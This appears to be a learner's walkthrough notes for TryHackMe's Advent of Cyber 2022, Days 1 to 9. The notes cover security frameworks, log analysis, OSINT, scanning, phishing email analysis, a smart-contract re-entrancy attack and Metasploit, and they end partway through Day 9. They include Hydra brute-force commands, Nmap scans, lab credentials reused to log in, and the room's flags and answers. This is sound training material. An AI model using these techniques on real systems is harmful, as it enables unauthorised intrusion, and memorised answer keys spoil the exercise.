---
startDate: 01.12.2022
endDate: 
user: h4ck47d4wn
tags: 
---
# [Advent Calendar 2022](https://tryhackme.com/room/adventofcyber4)

## [Day 1] `Frameworks` Someone's coming to town!

#frameworks #mitre #iso #killchain #nist

- Organisations such as Santa’s Best Festival Company must adjust and improve their cybersecurity efforts to prevent data breaches. 
- Security frameworks come into play to guide in setting up security programs and improve the security posture of the organisation.

- **Security frameworks** are documented processes that define policies and procedures organisations should follow to establish and manage security controls. 
	- They are blueprints for identifying and managing the risks they may face and the weaknesses in place that may lead to an attack.
- Frameworks help organisations remove the guesswork of securing their data and infrastructure by establishing processes and structures in a strategic plan. This will also help them achieve commercial and government regulatory requirements.

### NIST Cybersecurity Framework

- The Cybersecurity Framework (CSF) was developed by the National Institute of Standards and Technology (NIST), and it provides detailed guidance for organisations to manage and reduce cybersecurity risk. 
- The framework focuses on five essential functions: `**Identify**` -> `**Protect**` -> `**Detect**` -> `**Respond**` -> `**Recover.**` 
- With these functions, the framework allows organisations to prioritise their cybersecurity investments and engage in continuous improvement towards a target cybersecurity profile.

### ## ISO 27000 Series

- The International Organization of Standardization (ISO) develops a series of frameworks for different industries and sectors. 
- The ISO 27001 and 27002 standards are commonly known for cybersecurity and outline the requirements and procedures for creating, implementing and managing an information security management system (ISMS). 
- These standards can be used to assess an institution’s ability to meet set information security requirements through the application of risk management.

### MITRE ATT&CK Framework

- Identifying adversary plans of attack can be challenging to embark on blindly. 
- They can be understood through the behaviours, methods, tools and strategies established for an attack, commonly known as **Tactics**, **Techniques** and **Procedures** (TTPs). 
- The MITRE ATT&CK framework is a knowledge base of TTPs, carefully curated and detailed to ensure security teams can identify attack patterns. 
- The framework’s structure is similar to a periodic table, mapping techniques against phases of the attack chain and referencing system platforms exploited. 

- This framework highlights the detailed approach it provides when looking at an attack. 
- It brings together environment-specific cybersecurity information to provide cyber threat intelligence insights that help teams develop effective security programs for their organisations. 

#### Cyber Kill Chain

- A key concept of this framework was adopted from the military with the terminology **kill chain**, which describes the structure of an attack and consists of target identification, decision and order to attack the target, and finally, target destruction. 
- Developed by Lockheed Martin, the cyber kill chain describes the stages commonly followed by cyber attacks and security defenders can use the framework as part of intelligence-driven defence.


![Image showcasing the seven steps of the Cyber Kill Chain.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/1e0cdd3b3f3c33c18d67f25aad84e618.png)

### Unified Kill Chain

- The **Unified Kill Chain** can be described as the unification of the MITRE ATT&CK and Cyber Kill Chain frameworks. 
	- Published by Paul Pols in 2017 (and reviewed in 2022), the UKC provides a model to defend against cyber attacks from the adversary’s perspective.
- The UKC offers security teams a blueprint for analysing and comparing threat intelligence concerning the adversarial mode of working.

- The Unified Kill Chain describes 18 phases of attack based on Tactics, Techniques and Procedures (TTPs). 
- The individual phases can be combined to form overarching goals, such as gaining an initial foothold in a targeted network, navigating through the network to expand access and performing actions on critical assets. 

#### CYCLE 1: In

- The main focus of this series of phases is for an attacker to gain access to a system or networked environment. 
- Typically, cyber-attacks are initiated by an external attacker. The critical steps they would follow are:
	-   **Reconnaissance**: The attacker performs research on the target using publicly available information.
	-   **Weaponisation**: Setting up the needed infrastructure to host the command and control centre (C2) is crucial in executing attacks.
	-   **Delivery**: Payloads are malicious instruments delivered to the target through numerous means, such as email phishing and supply chain attacks.
	-   **Social Engineering**: The attacker will trick their target into performing untrusted and unsafe action against the payload they just delivered, often making their message appear to come from a trusted in-house source.
	-   **Exploitation**: If the attacker finds an existing vulnerability, a software or hardware weakness, in the network assets, they may use this to trigger their payload.
	-   **Persistence**: The attacker will leave behind a fallback presence on the network or asset to make sure they have a point of access to their target.
	-   **Defence Evasion**: The attacker must remain anonymous throughout their exploits by disabling and avoiding any security defence mechanisms enabled, including deleting evidence of their presence.
	-   **Command & Control**: Remember the infrastructure that the attacker prepared? A communication channel between the compromised system and the attacker’s infrastructure is established across the internet.

#### Clues:

1.  Research is part of my ask, finding clues in public sources.
2.  Simple documents I turn into malware.
3.  A pizza, parcel or payload all have me as an action in common.
4.  A con is the name of my game, tricking you into believing a false identity.
5.  Weaknesses are my go-to resources; through them, I make my presence felt.
6.  I am set up to let you back into the network after you leave.
7.  Deletion of evidence is part of my process.
8.  Communication with the compromised goes through me.

- This phase may be considered a loop as the attacker may be forced to change tactics or modify techniques if one fails to provide an entrance into the network.

#### CYCLE 2: Through

- Under this phase, attackers will be interested in gaining more access and privileges to assets within the network.

- The attacker may repeat this phase until the desired access is obtained.

	- **Pivoting**: Remember the system that the attacker may use for persistence? This system will become the attack launchpad for other systems in the network.
	-   **Discovery**: The attacker will seek to gather as much information about the compromised system, such as available users and data. Alternatively, they may remotely discover vulnerabilities and assets within the network. This opens the way for the next phase.
	-   **Privilege Escalation**: Restricted access prevents the attacker from executing their mission. Therefore, they will seek higher privileges on the compromised systems by exploiting identified vulnerabilities or misconfigurations.
	-   **Execution**: With elevated privileges, malicious code may be downloaded and executed to extract sensitive information or cause further havoc on the system.
	-   **Credential Access**: Part of the extracted sensitive information would include login credentials stored in the hard disk or memory. This provides the attacker with more firepower for their attacks.
	-   **Lateral Movement**: Using the extracted credentials, the attacker may move around different systems or data storages within the network, for example, within a single department.

#### Clues:

1.  I am an anchor that lets you go on an adventure and explore.
2.  With me, you can locate new information to expand the attack.
3.  Once a pawn, I became a King.
4.  My payloads are triggered to infect all they come in contact with.
5.  Passwords I collect are the keys to the mainframe.
6.  Side to side, machine to machine, we hop.

- **NOTE**: A key element that one may think is missing is Access. This is not formally covered as a phase of the UKC, as it overlaps with other phases across the different levels, leading to the adversary achieving their goals for an attack.

#### CYCLE 3: Out

- The Confidentiality, Integrity and Availability (CIA) of assets or services are compromised during this phase. 
- Money, fame or sabotage will drive attackers to undertake their reasons for executing their attacks, cause as much damage as possible and disappear without being detected.
	-   **Collection**: After finding the jackpot of data and information, the attacker will seek to aggregate all they need. By doing so, the assets’ confidentiality would be compromised entirely, especially when dealing with trade secrets and financial or personally identifiable information (PII) that is to be secured.
	-   **Exfiltration**: The attacker must get his loot out of the network. Various techniques may be used to ensure they have achieved their objectives without triggering suspicion.
	-   **Impact**: When compromising the availability or integrity of an asset or information, the attacker will use all the acquired privileges to manipulate, interrupt and sabotage. Imagine the reputation, financial and social damage an organisation would have to recover from.
	-   **Objectives**: Attackers may have other goals to achieve that may affect the social or technical landscape that their targets operate within. Defining and understanding these objectives tends to help security teams familiarise themselves with adversarial attack tools and conduct risk assessments to defend their assets.

#### Clues:

1.  In your vault, I am in.
2.  Like a dragon, I gather all valuable loot.
3.  I export gathered treasures.
4.  With me, your reputation goes tumbling down.
5.  Goals set, goals attained. I win!

### Questions

1. Who is the adversary that attacked Santa's network this year?

![](Pasted image 20221202181026.png)

A: The Bandit Yeti!

2. What's the flag that they left behind?

A: THM{IT'S A Y3T1 CHR1$TMA$}


## [Day 2] `Log Analysis` Santa's Naughty & Nice Log

#logfiles

- *Log files* are files that contain historical records of events and other data from an application. Some common examples of events that you may find in a log file:  
	-   Login attempts or failures
	-   Traffic on a network
	-   Things (website URLs, files, etc.) that have been accessed
	-   Password changes
	-   Application errors (used in debugging) 
- Scenario:
![Scenario](Pasted image 20221207085808.png)

- Log files come in all shapes and sizes. However, a useful log will contain at least some of the following attributes:

1.  A timestamp of the event (I.e. Date & Time)
2.  The name of the service that is generating the logfile (I.e. SSH is a remote device management protocol that allows a user to login into a system remotely)
3.  The actual event the service logs (i.e., in the event of a failed authentication, what credentials were tried, and by whom? (IP address)).

![](Pasted image 20221207092739.png)

- On Windows:
![](Pasted image 20221207093133.png)

- On this flavour of Linux, operating system log files (and often software-specific such as apache2) are located within the `/var/log` directory. We can use the `ls` in the `/var/log` directory to list all the log files located on the system:

![](Pasted image 20221207094016.png)

- Important log files:
![](Pasted image 20221207094238.png)

#grep 

- Common options for `grep`:
![](Pasted image 20221207094541.png)

### Questions

  
1. Use the `ls` command to list the files present in the current directory. How many log files are present?  
![](Pasted image 20221207095314.png)

 A: 2

2. Elf McSkidy managed to capture the logs generated by the web server. What is the name of this log file?  

 A: webserver.log
 
4. On what day was Santa's naughty and nice list stolen?  

- Did a grep search on 'stole'
- Everything happened on the 18th of November which was a Friday

A: Friday

5. What is the IP address of the attacker?  

- It is the one the records start with

 A: 10.10.249.191

6. What is the name of the important list that the attacker stole from Santa?  

- Did another grep but this time using pattern "santa":
![](Pasted image 20221207101004.png)

 A: santaslist.txt

7. Look through the log files for the flag. The format of the flag is: THM{}4

- First tried a grep on the /var/log files but that din not yield anything useful
- THen tried it on the current directory and found a match
![](Pasted image 20221207101530.png)
A: THM{STOLENSANTASLIST}
## [Day 3] `OSINT` Nothing escapes detective McRed

#osint

### **What is OSINT**

- **OSINT** is gathering and analysing publicly available data for intelligence purposes, which includes information collected from the internet, mass media, specialist journals and research, photos, and geospatial information. 
- The information can be accessed via the open internet (indexed by search engines), closed forums (not indexed by search engines) and even the deep and dark web. 

### **OSINT Techniques**

#### **Google Dorks**

#googledorking 

- **Google Dorking** involves using specialist search terms and advanced search operators to find results that are not usually displayed using regular search terms. 
	- You can use them to search specific file types, cached versions of a particular site, websites containing specific text etc.  
- Bad actors widely use it to locate website configuration files and loopholes left due to bad coding practices. Some of the widely used Google dorks are mentioned below:
	
	-   **`inurl`**: Searches for a specified text in all indexed URLs. For example, `inurl:hacking` will fetch all URLs containing the word "hacking".
	-   **`filetype`**: Searches for specified file extensions. For example, `filetype:pdf "hacking"` will bring all pdf files containing the word "hacking". 
	-   **`site`**: Searches all the indexed URLs for the specified domain. For example, `site:tryhackme.com` will bring all the indexed URLs from  `tryhackme.com`.
	-   **`cache`**: Get the latest cached version by the Google search engine. For example, `cache:tryhackme.com`.

#### **WHOIS Lookup**
#whois 

- **WHOIS** database stores public domain information such as registrant (domain owner), administrative, billing and technical contacts in a centralised database. 
- The database is publicly available for people to search against any domain and enables acquiring Personal Identifiable Information (PII) against a company, like an email address, mobile number etc., of technical contact. 
- Bad actors can, later on, use the information for profiling, [spear phishing campaigns](https://www.trendmicro.com/vinfo/us/security/definition/spear-phishing) (targeting selected individuals) etc. 
- Nowadays, registrars offer Domain Privacy options that allow users to keep their WHOIS information private from the general public and only accessible to certain entities like designated registrars.

#### **Robots.txt**
#robots 

- The robots.txt is a publicly accessible file created by the website administrator and intended for search engines to allow or disallow indexing of the website's URLs. 
	- All websites have their robots.txt file directly accessible through the domain's main URL. 
- It is a kind of communication mechanism between websites and search engine crawlers. Since the file is publicly accessible, it doesn't mean anyone can edit or modify it. 
- You can access robots.txt by simply appending robots.txt at the end of the website URL. 
	- For example, in the case of Google, we can access the robots.txt file by clicking this [URL](https://www.google.com/robots.txt).

#### **Breached Database Search**

- Major social media and tech giants have suffered data breaches in the past.  
	- As a result, the leaked data is publicly available and, most of the time contains PII like usernames, email addresses, mobile numbers and even passwords. 
- Users may use the same password across all the websites; that enables bad actors to re-use the same password against a user on a different platform for a complete account takeover. Many web services offer to check if your email address or phone number is in a leaked database; [HaveIBeenPwned](https://haveibeenpwned.com/) is one of the free services.

#### **Searching GitHub Repos**
#github

- GitHub is a renowned platform that allows developers to host their code through version control. 
	- A developer can create multiple repositories and set the privacy setting as well. 
- A common flaw by developers is that the privacy of the repository is set as public, which means anyone can access it. 
- These repositories contain complete source code and, most of the time, include passwords, access tokens, etc.

### Questions

  
What is the name of the Registrar for the domain santagift.shop?

- Searched on [WHOIS](https://who.is/whois/santagift.shop) the domain given and under the Registrar info the name can be found

![](Pasted image 20221208204158.png)

A: NAMECHEAP INC

Find the website's source code (repository) on [github.com](https://github.com/) and open the file containing sensitive credentials. Can you find the flag?  

- Searched the domain on github and found this repo:
![](Pasted image 20221208204324.png)

- The README file contains some useful info about credentials:
![](Pasted image 20221208204516.png)

- Inded, the `config.php` contains the flag:

![](Pasted image 20221208204605.png)

A: {THM_OSINT_WORKS}

What is the name of the file containing passwords?  

A: config.php

What is the name of the QA server associated with the website?  

- A simple search for `qa` in the `config.php` file gets us the name of the domain in which the server is hosted:

![](Pasted image 20221208204735.png)

A: qa.santagift.shop

What is the DB_PASSWORD that is being reused between the QA and PROD environments?

- The password can be found a bit lower:

![](Pasted image 20221208204837.png)

A: S@nta2022
## [Day 4] `Scanning` Scanning through the snow
#scanning 

- **Scanning** is a set of procedures for identifying live hosts, ports, and services, discovering the operating system of the target system, and identifying vulnerabilities and threats in the network. 
	- These scans are typically automated and give an insight into what could be exploited. 
	- Scanning reveals parts of the attack surface for attackers and allows launching targeted attacks to exploit the system.
- Scanning types:
	-   **Passive Scanning**: This method involves scanning a network without directly interacting with the target device (server, computer etc.). 
		- Passive scanning is usually carried out through packet capture and analysis tools like Wireshark; however, this technique only provides basic asset information like OS version, network protocol etc., against the target.
	-   **Active Scanning**: Active scanning is a scanning method whereby you scan individual endpoints in an IT network to retrieve more detailed information. 
		- The active scan involves sending packets or queries directly to specific assets rather than passively collecting that data by "catching" it in transit on the network's traffic. 
		- Active scanning is an immediate deep scan performed on targets to get detailed information. These targets can be a single endpoint or a network of endpoints.
### Scanning Techniques

#### Network Scanning
- Network scanning helps to discover and map a complete network, including any live computer or hosts, open ports, IP addresses, and services running on any live host and operating system. 
- Once the network is mapped, an attacker executes exploits as per the target system and services discovered. 
	- For example, a computer in a network with an outdated Apache version enables an attacker to launch an exploit against a vulnerable Apache server.

#### Port Scanning
#ports #port

- **Port scanning** is a conventional method to examine open ports in a network capable of receiving and sending data. 
- First, an attacker maps a complete network with installed devices/ hosts like firewalls, routers, servers etc., then scans open ports on each live host. 
	- Port number varies between 0 to 65,536 based on the type of service running on the host. 
- Port scanning results fall into the following three categories:
	-   **Closed Ports**: The host is not listening to the specific port.
	-   **Open Ports**: The host actively accepts a connection on the specific port.
	-   **Filtered Ports**: This indicates that the port is open; however, the host is not accepting connections or accepting connections as per certain criteria like specific source IP address.
#### **Vulnerability Scanning**

- The vulnerability scanning proactively identifies the network's vulnerabilities in an automated way that helps determine whether the system may be threatened or exploited. 
- Free and paid tools are available that help to identify loopholes in a target system through a pre-build database of vulnerabilities. 
	- Pentesters widely use tools such as [Nessus](https://www.tenable.com/products/nessus) and [Acunetix](https://www.acunetix.com/) to identify loopholes in a system.

### Scanning Tools

#### Network Mapper (Nmap)

#nmap 

- Nmap is a popular tool used to carry out port scanning, discover network protocols, identify running services, and detect operating systems on live hosts.

- A quick summary of important Nmap options:
	-   **TCP SYN Scan**: Get the list of live hosts and associated ports on the hosts without completing the TCP three-way handshake and making the scan a little stealthier.
		 - Usage: `nmap -sS 10.10.100.138`.
	-   **Ping Scan**: Allows scanning the live hosts in the network without going deeper and checking for ports services etc. 
		- Usage: `nmap -sn 10.10.100.138`.
	-   **Operating System Scan**: Allows scanning of the type of OS running on a live host. 
		- Usage: `nmap -O 10.10.100.138`.
	-   **Detecting Services**: Get a list of running services on a live host. 
		- Usage: `nmap -sV 10.10.100.138`

#### **Nikto**
#nikto

- Nikto is open-source software that allows scanning websites for vulnerabilities. 
- It enables looking for subdomains, outdated servers, debug messages etc., on a website. 
- You can access it on the AttackBox by typing `nikto -host 10.10.100.138`.


### Questions

  
What is the name of the HTTP server running on the remote host?

- Did an NMAP scan with the option `-sV` to get the services:

![](Pasted image 20221209210841.png)

A: Apache

What is the name of the service running on port 22 on the QA server?  

- We can depict this information from the search we did above

 A: ssh

What flag can you find after successfully accessing the Samba service?  

- Typed in the address bar the location of the smb servers `smb://10.10.100.138/`

![](Pasted image 20221209211026.png)

- Log in in the admins server using the credentials `ubuntu:S@nta2022`

![](Pasted image 20221209211138.png)

- We get two files: `flag.txt` and `userlist.txt`:

![](Pasted image 20221209211222.png)

- First one gets us the flag 

A: {THM_SANTA_SMB_SERVER}

What is the password for the username santahr?

- The second file found contains some users and their passwords:

![](Pasted image 20221209211330.png)

A: santa25


## [Day 5] `Brute-Forcing` He knows when you're awake

### Remote Access Services

The need for remote administration of computer systems led to the development of various software packages and protocols. We will mention three examples:

1.  SSH
2.  RDP
3.  VNC

#ssh #rdp #vnc

- **SSH** stands for **Secure Shell**. It was initially used in Unix-like systems for remote login. 
	- It provides the user with a command-line interface (CLI) that can be used to execute commands.

- **RDP** stands for **Remote Desktop Protocol**; it is also known as Remote Desktop Connection (RDC) or simply Remote Desktop (RD). 
	- It provides a graphical user interface (GUI) to access an MS Windows system. 
	- When using Remote Desktop, the user can see their desktop and use the keyboard and mouse as if sitting at the computer.

- **VNC** stands for **Virtual Network Computing**. 
	- It provides access to a graphical interface which allows the user to view the desktop and (optionally) control the mouse and keyboard. 
	- VNC is available for any system with a graphical interface, including MS Windows, Linux, and even macOS, Android and Raspberry Pi.

- Based on our systems and needs, we can select one of these tools to control a remote computer; however, for security purposes, we need to think about how we can prove our identity to the remote server.

### Authentication

- Authentication refers to the process where a system validates your identity. 
- The process starts with the user claiming a specific unique identity, such as claiming to be the owner of a particular username. 
- Furthermore, the user needs to prove their identity. 
- This process is usually achieved by one, or more, of the following:

1.  **Something you know** refers, in general, to something you can memorize, such as a password or a PIN (Personal Identification Number).
2.  **Something you have** refers to something you own, hardware or software, such as a security token, a mobile phone, or a key file. The security token is a physical device that displays a number that changes periodically.
3.  **Something you are** refers to biometric authentication, such as when using a fingerprint reader or a retina scan.

- Back to remote access services, we usually use passwords or private key files for authentication. 
- Using a password is the default method for authentication and requires the least amount of steps to set up. 
	- Unfortunately, passwords are prone to a myriad of attacks.

### Attacking Passwords

- Passwords are the most commonly used authentication methods. 
	- Unfortunately, they are exposed to a variety of attacks. 
- Some attacks don’t require any technical skills, such as shoulder surfing or password guessing. 
	- Other attacks require the use of automated tools.

- The following are some of the ways used in attacks against passwords:

1.  **Shoulder Surfing:** Looking over the victim’s shoulder might reveal the pattern they use to unlock their phone or the PIN code to use the ATM. This attack requires the least technical knowledge.
2.  **Password Guessing:** Without proper cyber security awareness, some users might be inclined to use personal details, such as birth date or daughter’s name, as these are easiest to remember. Guessing the password of such users requires some knowledge of the target’s personal details; their birth year might end up as their ATM PIN code.
3.  **Dictionary Attack:** This approach expands on password guessing and attempts to include all valid words in a dictionary or a word list.
4.  **Brute Force Attack:** This attack is the most exhaustive and time-consuming, where an attacker can try all possible character combinations.

- Let’s focus on dictionary attacks. Over time, hackers have compiled one list after another of passwords leaked from data breaches. 
- One example is RockYou’s list of breached passwords, which you can find on the AttackBox at `/usr/share/wordlists/rockyou.txt`. 
	- The choice of the word list should depend on your knowledge of the target. 
- For instance, a French user might use a French word instead of an English one. 
- Consequently, a French word list might be more promising.

- RockYou’s word list contains more than 14 million unique passwords. Even if we want to try the top 5%, that’s still more than half a million. We need to find an automated way.

#hydra 

- The general command-line syntax is the following:

`hydra -l username -P wordlist.txt server service` where we specify the following options:

-   `-l username`: `-l` should precede the `username`, i.e. the login name of the target. You should omit this option if the service does not use a username.
-   `-P wordlist.txt`: `-P` precedes the `wordlist.txt` file, which contains the list of passwords you want to try with the provided username.
-   `server` is the hostname or IP address of the target server.
-   `service` indicates the service in which you are trying to launch the dictionary attack.

- Examples:
	-   `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.243.94 ssh` will use `mark` as the username as it iterates over the provided passwords against the SSH server.
	-   `hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://10.10.243.94` is identical to the previous example. `10.10.243.94 ssh` is the same as `ssh://10.10.243.94`.

- You can replace `ssh` with another protocol name, such as `rdp`, `vnc`, `ftp`, `pop3` or any other protocol supported by Hydra.

- There are some extra optional arguments that you can add:
	-   `-V` or `-vV`, for verbose, makes Hydra show the username and password combinations being tried. This verbosity is very convenient to see the progress, especially if you still need to be more confident in your command-line syntax.
	-   `-d`, for debugging, provides more detailed information about what’s happening. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, `-d` will reveal this immediately.
- 
### Questions

  
Use Hydra to find the VNC password of the target with IP address `MACHINE_IP`. What is the password?

- The VNC does not have a username so we don't specify that in our hydra attack:

![](Pasted image 20221210182114.png)

A: 1q2w3e4r

Using a VNC client on the AttackBox, connect to the target of IP address `MACHINE_IP`. What is the flag written on the target’s screen?

- Connecting via `Remmina` to the VNC server will enable us to get the flag, which is found on the desktop

![](Pasted image 20221210182352.png)

A: THM{I_SEE_YOUR_SCREEN}
## [Day 6] `Email Analysis` It's beginning to look a lot like phishing

#phishing  #emailanalysis

- Email analysis is the process of extracting the email header information to expose the email file details. 
- The email header contains the technical details of the email like sender, recipient, path, return address and attachments. 
- Usually, these details are enough to determine if there is something suspicious/abnormal in the email and decide on further actions on the email, like filtering/quarantining or delivering. 
	- This process can be done manually and with the help of tools.

- There are two main concerns in email analysis.
	-   **Security issues:** Identifying suspicious/abnormal/malicious patterns in emails.
	-   **Performance issues:** Identifying delivery and delay issues in emails.

-   **Social engineering:** Social engineering is the psychological manipulation of people into performing or divulging information by exploiting weaknesses in human nature. 
	- These "weaknesses" can be curiosity, jealousy, greed, kindness, and willingness to help someone.

-   **Phishing:** Phishing is a sub-section of social engineering delivered through email to trick someone into either revealing personal information and credentials or executing malicious code on their computer.

- Phishing emails will usually appear to come from a trusted source, whether that's a person or a business.
	- They include content that tries to tempt or trick people into downloading software, opening attachments, or following links to a bogus website.

### How to Analyse Emails?

- Before learning how to conduct an email analysis, you need to know the structure of an email header. 
- Email header structure:

![](Pasted image 20221210183110.png)

- Analysing multiple header fields can be confusing at first glance, but starting from the key points will make the analysis process slightly easier. 
- A simple process of email analysis is shown below:

![](Pasted image 20221210183411.png)

#emlanalyzer

![](Pasted image 20221210183707.png)

- Additionally, you can use some Open Source Intelligence (OSINT) tools to check email reputation and enrich the findings. 
- Visit the given site below and do a reputation check on the sender address and the address found in the return path.

-   **Tool:** `https://emailrep.io/`

![](Pasted image 20221210183850.png)


### Questions

What is the email address of the sender?

- Used the `emlanalyzer` tool to get the info about the email and download the attachments:
	- `emlAnalyzer -i Urgent\:.eml --header --html -u --text --extract-all`

![](Pasted image 20221210184411.png)


A: chief.elf@santaclaus.thm

What is the return address?  

- Check the `Return-Path` field

 A: murphy.evident@bandityeti.thm

On whose behalf was the email sent?  

 A: Chief Elf

What is the X-spam score?  

 A: 3

What is hidden in the value of the Message-ID field?  

- Decode base64: `echo 'QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==' | base64 -d`

 A: AoC2022_Email_Analysis

Visit the email reputation check website provided in the task.  
What is the reputation result of the sender's email address?  

![](Pasted image 20221210192717.png)

 A: RISKY

Check the attachments.  
What is the filename of the attachment?  

- Check the generated `eml_attachments` directory

 A: Division_of_labour-Load_share_plan.doc

What is the hash value of the attachment?  

- `sha256sum eml_attachments/Division_of_labour-Load_share_plan.doc`

 A: 0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467

Visit the Virus Total website and use the hash value to search.  
Navigate to the behaviour section.  
What is the second tactic marked in the Mitre ATT&CK section?  

![](Pasted image 20221210193148.png)

 A: Defense Evasion

Visit the InQuest website and use the hash value to search.  
What is the subcategory of the file?

![](Pasted image 20221210193313.png)

A: macro_hunter
## [Day 7] `CyberChef` Maldocs roasting on an open fire

#cyberchef 

![](Pasted image 20221213175253.png)

1.  Add the text or file in panel 1.
2.  Panel 2 contains various functions, also known as recipes that we use to encode, decode, parse, search or filter the data.
3.  Drag the functions or recipes from Panel 2 into Panel 3 to create a recipe.
4.  The output from the recipes is shown in panel 4.
5.  Click on bake to run the functions added in Panel 3 in order. We can select AutoBake to automatically run the recipes as they are added.

- 

### Questions

What is the version of CyberChef found in the attached VM?

- Version can be seen on the top left corner of the offline CyberChef version in the deployed VM:

![](Pasted image 20221213175557.png)

 A: 9.49.0

How many recipes were used to extract URLs from the malicious doc?  

- Following THM's tutorial to extract the URL from the doc, you will be using 10 recipes

 A: 10

We found a URL that was downloading a suspicious file; what is the name of that malware?  

- These are the final URLs:

![](Pasted image 20221213181142.png)

- It is clear that the file we are talking about can be found in the first URL

A: mysterygift.exe

What is the last defanged URL of the bandityeti domain found in the last step?  

- `defanged` = to make harmless or less powerful

- These are the defanged URLs:

![](Pasted image 20221213181338.png)

 A: hxxps[://]cdn[.]bandityeti[.]THM/files/index/

What is the ticket found in one of the domains? (Format: Domain/<GOLDEN_FLAG>)

A: THM_MYSTERY_FLAG
## [Day 8] `Smart Contracts` Last Christmas I gave you my ETH

#blockchain #smartcontracts

- Informally, a **blockchain** acts as a database to store information in a specified format and is shared among members of a network with no one entity in control.
- By definition, a blockchain is a digital database or ledger distributed among nodes of a peer-to-peer network. 
- The blockchain is distributed among "peers" or members with no central servers, hence "decentralized." 
- Due to its decentralized nature, each peer is expected to maintain the integrity of the blockchain. 
- If one member of the network attempted to modify a blockchain maliciously, other members would compare it to their blockchain for integrity and determine if the whole network should express that change.

- The core blockchain technology aims to be decentralized and maintain integrity; cryptography is employed to negotiate transactions and provide utility to the blockchain.

- But what does this mean for security? 
- If we ignore the core blockchain technology itself, which relies on cryptography, and instead focus on how data is transferred and negotiated, we may find the answer concerning.

#smartcontracts 

-  **Smart contracts** are most commonly used as the backbone of DeFi applications (Decentralized Finance applications) to support a cryptocurrency on a blockchain. 
- DeFi applications facilitate currency exchange between entities; a smart contract defines the details of the exchange. 
- A smart contract is a program stored on a blockchain that runs when pre-determined conditions are met.

- Smart contracts are very comparable to any other program created from a scripting language. 
- Several languages, such as Solidity, Vyper, and Yul, have been developed to facilitate the creation of contracts. 
- Smart contracts can even be developed using traditional programming languages such as Rust and JavaScript; at its core, smart contracts wait for conditions and execute actions, similar to traditional logic.

- Let's imagine a contract was a class. 
- Depending on the fields or information stored in a class, you may want individual fields to be private, preventing access or modification unless conditions are met. 
- A smart contract's fields or information should be private and only accessed or modified from functions defined in the contract.
- A contract commonly has several functions that act similarly to accessors and mutators, such as checking balance, depositing, and withdrawing currency.

- Once a contract is deployed on a blockchain, another contract can then use its functions to call or execute the functions we just defined above.
- If we controlled Contract A and Contract B wanted to first deposit 1 Ethereum, and then withdraw 1 Ethereum from Contract A,

- Contract B calls the deposit function of Contract A.

- Contract A authorizes the deposit after checking if any pre-determined conditions need to be met.
- 
![](Pasted image 20221213182618.png)

- Contract B calls the withdraw function of Contract A.

- Contract A authorizes the deposit if the pre-determined conditions for withdrawal are met.

![](Pasted image 20221213182645.png)

- Contract B can execute other functions after the Ether is sent from Contract A but before the function resolves.

![](Pasted image 20221213182708.png)

### How do Vulnerabilities in Smart Contracts Occur?

- Most smart contract vulnerabilities arise due to logic issues or poor exception handling. 
- Most vulnerabilities arise in functions when conditions are insecurely implemented through the previously mentioned issues.

- Let's take a step back to Contract A in the previous section. 
- The conditions of the withdraw function are,

	-   Balance is greater than zero
	-   Send Etherium

- At first glance, this may seem fine, but when is the amount to be sent subtracted from the balance? 
- Referring back to the contract diagram, it is only ever deducted from the balance after the Etherium is sent. 
	- Is this an issue? 
- The function should finish before the contract can process any other functions. 
- But if you recall, a contract can consecutively make new calls to a function while an old function is still executing. 
- An attacker can continuously attempt to call the withdraw function before it can clear the balance; this means that the pre-defined conditions will always be met. 
	- A developer must modify the function's logic to remove the balance before another call can be made or require stricter requirements to be met.

### The Re-entrancy Attack
#reentrancy
- Reiterating what was covered above, re-entrancy occurs when a malicious contract uses a fallback function to continue depleting a contract's total balance due to flawed logic after an initial withdraw function occurs.

- Assuming that contract B is the attacking contract and contract A is the storage contract. 
- Contract B will execute a function to deposit, then withdraw at least one Ether. 
- This process is required to initiate the withdraw function's response.

![](Pasted image 20221213183035.png)

- Note the difference between account balance and total balance in the above diagram. 
- The storage contract separates balances per account and keeps each account's total balance combined. 
- We are specifically targeting the total balance we do not own to exploit the contract.

![](Pasted image 20221213183129.png)

- At this point, contract B can either drop the response from the withdraw function or invoke a fallback function. 
- A fallback function is a reserved function in Solidity that can appear once in a single contract. 
- The function is executed when currency is sent with no other context or data, for example, what is happening in this example. 
- The fallback function calls the withdraw function again, while the original call to the function was never fully resolved. 
- Remember, the balance is never set back to zero, and the contract thinks of Ether as its total balance when sending it, not divided into each account, so it will continue to send currency beyond the account's balance until the total balance is zero.

![](Pasted image 20221213183240.png)

- Because the withdraw function sends Ether with no context or data, the fallback function will be called again, and thus an infinite loop can now occur.

### Questions

What flag is found after attacking the provided EtherStore Contract?

- Followed the instructions in THM task

- Started with 10 ETH in the store and after executing the attack asking for just 1 ETH, the store is left with 0 ETH and the attacker gets 11 ETH in return

![](Pasted image 20221214081329.png)

A: flag{411_ur_37h_15_m1n3}


## [Day 9] `Pivoting` Dock the halls

#docker #metasploit 

### What is Docker?

- Docker is a way to package applications, and the associated dependencies into a single unit called an image. 
- This image can then be shared and run as a container, either locally as a developer or remotely on a production server.
#important
- A common way to tell if a compromised application is running in a Docker container is to verify the existence of a `/.dockerenv` file at the root directory of the filesystem.

### What is Metasploit?

- Metasploit is a powerful penetration testing tool for gaining initial access to systems, performing post-exploitation, and pivoting to other applications and systems. 
- Metasploit is free, open-source software owned by the US-based cybersecurity firm Rapid7.

### What is a Metasploit session?

- After successfully exploiting a remote target with a Metasploit module, a session is often opened by default. 
- These sessions are often Command Shells or Meterpreter sessions, which allow for executing commands against the target. 
- It’s also possible to open up other session types in Metasploit, such as SSH or WinRM - which do not require payloads.

- The common Metasploit console commands for viewing and manipulating sessions in Metasploit are:

```metasploit
# view sessions 
sessions 

# upgrade the last opened session to Meterpreter 
sessions -u -1 

# interact with a session 
sessions -i session_id 

# Background the currently interactive session, and go back to the Metasploit prompt background
```


### What is Meterpreter?
#meterpreter

- Meterpreter is an advanced payload that provides interactive access to a compromised system. 
- Meterpreter supports running commands on a remote target, including uploading/downloading files and pivoting.

- Meterpreter has multiple useful commands, such as the following:

```meterpreter
# Get information about the remote system, such as OS 
sysinfo 

# Upload a file or directory 
upload local_file.txt 

# Display interfaces 
ipconfig 

